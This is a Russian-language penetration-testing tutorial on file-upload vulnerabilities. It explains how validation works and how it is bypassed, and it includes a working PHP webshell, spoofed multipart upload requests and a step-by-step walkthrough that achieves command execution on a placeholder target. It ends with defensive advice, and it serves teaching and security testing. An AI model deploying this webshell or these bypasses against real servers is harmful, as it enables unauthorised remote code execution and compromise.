# Загрузка Webshell через уязвимость File Upload: Механизмы эксплуатации, обхода защиты и практическая реализация

## Контекст и базовые понятия

Функциональность загрузки файлов (File Upload) является неотъемлемой частью архитектуры современных веб-приложений, обеспечивая взаимодействие пользователя с сервером через передачу бинарных или текстовых данных. Уязвимость File Upload возникает, когда серверная логика обработки загружаемых файлов некорректно валидирует их тип, содержимое или целевую директорию сохранения, позволяя злоумышленнику загрузить исполняемый скрипт (Webshell) вместо ожидаемого ресурса (изображения, документа). Ключевое различие между успешной эксплуатацией этой уязвимости и обычной загрузкой контента заключается в интерпретации загруженного файла веб-сервером или прикладным движком. Если файл сохраняется в директории, доступной по HTTP, и сервер настроен на выполнение кода из файлов с определенным расширением (например, `.php`, `.jsp`, `.asp`), загрузка такого файла приводит к Remote Code Execution (RCE) на уровне сервера.

Важно разграничивать два основных вектора эксплуатации уязвимостей загрузки файлов: клиентский и серверный. Клиентская эксплуатация (например, Stored XSS через загрузку SVG или HTML-файлов) направлена на компрометацию пользователей, просматривающих загруженный контент. Серверная эксплуатация, являющаяся фокусом данного конспекта, направлена на получение контроля над инфраструктурой. В этом контексте Webshell представляет собой специализированное веб-приложение, работающее на стороне сервера, которое предоставляет интерфейс для выполнения произвольных системных команд или выполнения произвольного кода.

Существует путаница между понятиями «File Upload Vulnerability» и «Remote File Inclusion (RFI)». Хотя оба вектора могут приводить к выполнению вредоносного кода, их механизмы различны. При уязвимости File Upload злоумышленник физически загружает файл на целевой сервер и затем обращается к нему напрямую. При RFI злоумышленник не загружает файл на сервер, а заставляет сервер включить и выполнить код, находящийся на удаленном (контролируемом атакующим) сервере, используя функции языка (например, `include()` в PHP). В современных условиях RFI встречается реже из-за отключения `allow_url_include`, тогда как File Upload остается критическим вектором из-за необходимости предоставления функционала загрузки пользователям.

Для понимания архитектуры уязвимости необходимо определить понятие «Web Root» (корневая директория веб-сервера). Это директория, содержимое которой доступно по HTTP-протоколу. Загрузка файла за пределы Web Root (например, в `/tmp` или `/var/backups`) делает его недоступным для прямого HTTP-доступа и, следовательно, не позволяет выполнить его через браузер, если только не используется вторичная уязвимость (например, Local File Inclusion).

| Характеристика | File Upload (Server-Side) | Remote File Inclusion (RFI) | Stored XSS (через Upload) |
| :--- | :--- | :--- | :--- |
| **Цель** | Выполнение кода на сервере (RCE) | Выполнение кода на сервере (RCE) | Выполнение кода в браузере жертвы |
| **Механизм** | Загрузка файла на диск сервера | Включение удаленного ресурса | Вставка скрипта в хранимый контент |
| **Требование к серверу** | Наличие интерпретатора (PHP, ASP) | `allow_url_include = On` | Отсутствие экранирования вывода |
| **Доступ к файлу** | Прямой HTTP-запрос к загруженному файлу | HTTP-запрос к целевому скрипту | HTTP-запрос к странице с контентом |
| **Типичные расширения** | `.php`, `.jsp`, `.asp`, `.phtml` | Любые, поддерживаемые `include()` | `.svg`, `.html`, `.js`, `.xml` |

## Внутреннее устройство предмета

Уязвимость File Upload базируется на нарушении принципа разделения доверенных и недоверенных данных. Процесс обработки загруженного файла состоит из нескольких этапов: прием HTTP-запроса (обычно `POST` с `multipart/form-data`), извлечение метаданных файла (имя, MIME-тип, размер), валидация этих данных, сохранение файла на файловую систему и генерация ссылки для доступа. Уязвимость возникает на любом из этих этапов, если проверка опирается на данные, контролируемые пользователем, без достаточной серверной верификации.

### 1. Валидация по расширению файла (Extension Validation)
Наиболее распространенный, но уязвимый метод защиты. Сервер проверяет расширение файла (последнюю часть имени после точки) и сравнивает его с белым или черным списком.
*   **Черный список (Blacklist):** Запрещает известные опасные расширения (`.php`, `.jsp`, `.exe`). Уязвимость возникает из-за неполноты списка. Например, на серверах Apache с модулем `mod_php` могут выполняться файлы с расширениями `.php3`, `.php4`, `.php5`, `.phtml`, `.phpt`. На серверах IIS (Windows) могут выполняться файлы с расширениями `.asp`, `.aspx`, `.cer`, `.asa`.
*   **Белый список (Whitelist):** Разрешает только определенные расширения (`.jpg`, `.png`). Более надежен, но уязвим к обходу через двойные расширения или нестандартные символы.

### 2. Валидация по MIME-типу (MIME Type Validation)
Сервер проверяет поле `Content-Type` в HTTP-запросе или заголовок `Content-Type` внутри multipart-запроса.
*   **Уязвимость:** Злоумышленник может подделать поле `Content-Type` в Burp Suite, указав `image/jpeg` для PHP-скрипта.
*   **Проверка Magic Numbers:** Более надежный метод. Сервер читает первые байты файла (Magic Bytes). Для JPEG это `FF D8 FF`, для PNG — `89 50 4E 47`. Уязвимость возникает, если сервер проверяет только заголовок, но не содержимое, или если проверка содержимого реализована некорректно (например, проверка только первых 2 байт без проверки структуры).

### 3. Валидация по содержимому (Content Validation)
Анализ бинарного содержимого файла на соответствие структуре ожидаемого формата. Например, проверка, что файл действительно является валидным изображением с помощью функций библиотеки (GD, ImageMagick).
*   **Уязвимость:** Если сервер пытается открыть файл как изображение для проверки, но не очищает его после проверки, или если проверка происходит до сохранения, злоумышленник может использовать полиморфные векторы (например, GIF89a с PHP-кодом в комментариях, если интерпретатор PHP настроен на выполнение кода в GIF).

### 4. Валидация по имени файла (Filename Validation)
Проверка имени файла на наличие специальных символов, путей или недопустимых расширений.
*   **Уязвимость Path Traversal:** Если сервер не экранирует символы `../` в имени файла, злоумышленник может сохранить файл за пределами целевой директории (например, в `/var/www/html/`).
*   **Уязвимость Null Byte Injection:** В старых версиях PHP (до 5.3.4) символ `%00` мог обрезать часть имени файла, позволяя сохранить `shell.php%00.jpg` как `shell.php`. В современных системах это не работает, но может быть актуально для других языков или конфигураций.

### 5. Валидация по контексту выполнения (Context Validation)
Даже если файл сохранен, он должен быть выполнен. Уязвимость возникает, если директория загрузки имеет права на выполнение скриптов (Execute permissions), или если веб-сервер настроен на обработку файлов из этой директории как исполняемых.

| Метод защиты | Принцип работы | Типичные векторы обхода |
| :--- | :--- | :--- |
| **Extension Check** | Сравнение суффикса имени файла с списком | Двойные расширения (`.php.jpg`), нестандартные расширения (`.phtml`, `.phar`) |
| **MIME Check** | Проверка заголовка `Content-Type` | Подделка заголовка в HTTP-запросе |
| **Magic Bytes** | Проверка первых байтов файла (заголовка) | Создание валидного изображения с внедренным кодом (например, GIF с PHP в комментариях) |
| **Filename Sanitization** | Очистка имени файла от спецсимволов | Path Traversal (`../../`), Null Bytes (устаревшие системы) |
| **Random Rename** | Сохранение файла с случайным именем | Обход невозможен, если файл остается в исполняемой директории |
| **Storage Outside Webroot** | Сохранение в директорию, недоступную по HTTP | Требует вторичной уязвимости (LFI, RCE) для доступа к файлу |

## Применение и работа с предметом

На практике тестирование на проникновение уязвимостей File Upload требует системного подхода, включающего реверс-инжиниринг логики валидации и многократное тестирование различных векторов обхода. Инструментарий обычно включает прокси-инструменты (Burp Suite, OWASP ZAP) для перехвата и модификации запросов, а также локальные скрипты для генерации payload.

### 1. Подготовка и разведка
Первым шагом является идентификация точки загрузки. Это может быть форма загрузки аватара, прикрепление файлов к сообщению, загрузка документов в личный кабинет. Важно зафиксировать исходный HTTP-запрос.
*   **Анализ ответа сервера:** Сервер может возвращать информацию о допустимых расширениях или MIME-типах в теле ответа или заголовках (например, `Allowed extensions: jpg, png`).
*   **Анализ клиентской валидации:** Часто проверка типа файла происходит на стороне JavaScript. Отключение JS в браузере или использование Burp Suite позволяет обойти эту проверку.

### 2. Базовая загрузка Webshell
Стандартный Webshell для PHP, используемый для демонстрации RCE:
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
Этот скрипт принимает параметр `cmd` из GET-запроса и выполняет его через системную оболочку. Для загрузки требуется создать файл с этим кодом и изменить расширение на допустимое (если возможно) или обойти проверку.

### 3. Техники обхода валидации

#### Обход по расширению (Blacklist Bypass)
Если сервер блокирует `.php`, можно попробовать альтернативные расширения, поддерживаемые интерпретатором.
*   **Apache + PHP:** `.php3`, `.php4`, `.php5`, `.phtml`, `.phpt`.
*   **IIS + ASP:** `.asp`, `.aspx`, `.cer`, `.asa`, `.cdx`.
*   **Nginx + PHP-FPM:** `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`.
*   **Двойные расширения:** `shell.php.jpg`. Некоторые серверы (например, старые версии Apache) могут интерпретировать файл как PHP, если он содержит `.php` в имени, игнорируя `.jpg`.

#### Обход по MIME-типу
В Burp Suite Repeater изменить поле `Content-Type` в multipart-запросе:
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
Здесь имя файла `shell.php`, но MIME-тип указан как `image/jpeg`. Если сервер проверяет только заголовок, файл будет принят.

#### Обход по Magic Bytes (GIF89a)
Для обхода проверки первых байтов можно создать файл, который начинается с валидного заголовка GIF, но содержит PHP-код.
```text
GIF89a
<?php system($_GET['cmd']); ?>
```
Некоторые интерпретаторы PHP (особенно с включенным `auto_prepend_file` или специфическими настройками) могут выполнить код из GIF, если он находится в комментариях или после валидного заголовка. Однако это зависит от конфигурации.

#### Обход через Path Traversal
Если сервер сохраняет файл в директорию `/uploads/avatars/`, но не экранирует имя файла, можно использовать `../` для выхода из директории.
*   **Имя файла:** `../../shell.php`
*   **Результат:** Файл сохраняется в `/uploads/shell.php`, если нет проверок на `..`.

### 4. Типичные ошибки и подводные камни
*   **Игнорирование серверной валидации:** Полагаться только на клиентские проверки.
*   **Неполные белые списки:** Разрешение `.jpg` без проверки содержимого.
*   **Хранение в Webroot:** Даже если файл не исполняется, его содержимое может быть скачано, если нет директивы `Options -Indexes` или `deny from all` в конфигурации веб-сервера.
*   **Использование устаревших интерпретаторов:** PHP 5.x уязвим к Null Byte Injection.

## Сквозной практический пример: Обход blacklist расширений и загрузка Webshell

**Исходные условия:**
Целевое веб-приложение на базе PHP/Apache позволяет пользователям загружать аватары. Серверная валидация использует черный список расширений, блокируя `.php`, `.phtml`, `.php3`. MIME-тип проверяется по заголовку `Content-Type`. Файлы сохраняются в директорию `/var/www/html/uploads/avatars/`.

**Шаг 1: Анализ запроса загрузки**
Загружаем валидный файл `avatar.jpg` и перехватываем запрос в Burp Suite.
```http
POST /api/upload/avatar HTTP/1.1
Host: target-app.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
Content-Type: image/jpeg

[JPG DATA]
------WebKitFormBoundaryXYZ--
```

**Шаг 2: Подготовка Webshell с обходом blacklist**
Создаем файл `shell.phtml` на локальной машине. Расширение `.phtml` часто игнорируется в blacklist, если оно не добавлено явно, так как оно функционально эквивалентно `.php`.
```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

**Шаг 3: Модификация запроса в Burp Repeater**
Изменяем имя файла на `shell.phtml` и сохраняем валидный MIME-тип `image/jpeg` (если сервер проверяет только заголовок) или валидный заголовок GIF (если проверяет magic bytes).
```http
POST /api/upload/avatar HTTP/1.1
Host: target-app.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="avatar"; filename="shell.phtml"
Content-Type: image/jpeg

<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
------WebKitFormBoundaryXYZ--
```
*Примечание:* Если сервер проверяет Magic Bytes, заменяем начало payload на `GIF89a` и добавляем валидные байты изображения, чтобы пройти проверку, но сохранить PHP-код в комментариях или после заголовка.

**Шаг 4: Отправка запроса и получение URL**
Отправляем запрос. Сервер возвращает ответ с URL загруженного файла:
```json
{
  "status": "success",
  "url": "http://target-app.com/uploads/avatars/shell.phtml"
}
```

**Шаг 5: Проверка выполнения кода**
Отправляем GET-запрос к загруженному файлу с параметром `cmd`.
```http
GET /uploads/avatars/shell.phtml?cmd=id HTTP/1.1
Host: target-app.com
```

**Ожидаемый вывод:**
Сервер возвращает HTML-страницу с выводом команды `id`:
```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```
Это подтверждает успешную загрузку Webshell и выполнение кода на сервере.

## Аналитический вывод

Уязвимость File Upload представляет собой критический риск для безопасности веб-приложений, так как позволяет злоумышленникам обходить стандартные механизмы защиты путем комбинирования нескольких векторов обхода. Эффективная защита требует многоуровневого подхода: валидация по белому списку расширений, проверка Magic Bytes, ренейминг файлов с использованием случайных идентификаторов и хранение загруженных файлов в директориях, недоступных для прямого HTTP-доступа или исполнения кода. Использование WAF может помочь выявить попытки эксплуатации, но не заменяет корректную серверную валидацию. Для специалистов по информационной безопасности понимание механизмов обхода blacklist и MIME-проверок является необходимым навыком для проведения эффективного тестирования на проникновение и оценки реального уровня безопасности инфраструктуры.
